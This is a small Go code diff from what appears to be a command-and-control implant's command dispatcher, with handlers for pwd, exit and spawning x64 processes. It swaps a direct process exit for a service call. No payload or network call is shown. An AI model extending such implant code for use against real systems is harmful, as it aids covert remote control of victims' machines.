@@ -7,7 +7,6 @@ import (
 	"main/crypt"
 	"main/packet"
 	"main/services"
-	"os"
 	"time"
 )
 
@@ -79,7 +78,8 @@ func main() {
 								result, err = services.CmdPwd()
 								callbackType = 0
 							case packet.CMD_TYPE_EXIT:
-								os.Exit(0)
+								result, err = services.CmdExit()
+								callbackType = 0
 							case packet.CMD_TYPE_SPAWN_X64:
 								result, err = services.CmdSpawnX64(cmdBuf)
 								callbackType = 0
